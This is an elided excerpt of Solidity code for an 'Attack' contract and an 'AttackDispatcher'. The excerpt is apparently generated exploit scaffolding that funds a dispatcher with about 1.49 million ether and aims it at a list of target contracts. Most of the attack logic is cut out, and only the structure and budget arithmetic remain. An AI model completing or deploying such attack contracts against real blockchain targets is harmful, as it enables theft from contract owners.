 ...
 * parameter. Make sure to send at least 1486964 ether and 841498641650941953 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x13ae0868c49a2f7e40000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x13ae0868c49a2f7e40001; /* equals 1486964 ether and 841498641650941953 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 1486964841498641650941952 }(0, _targets);
    }
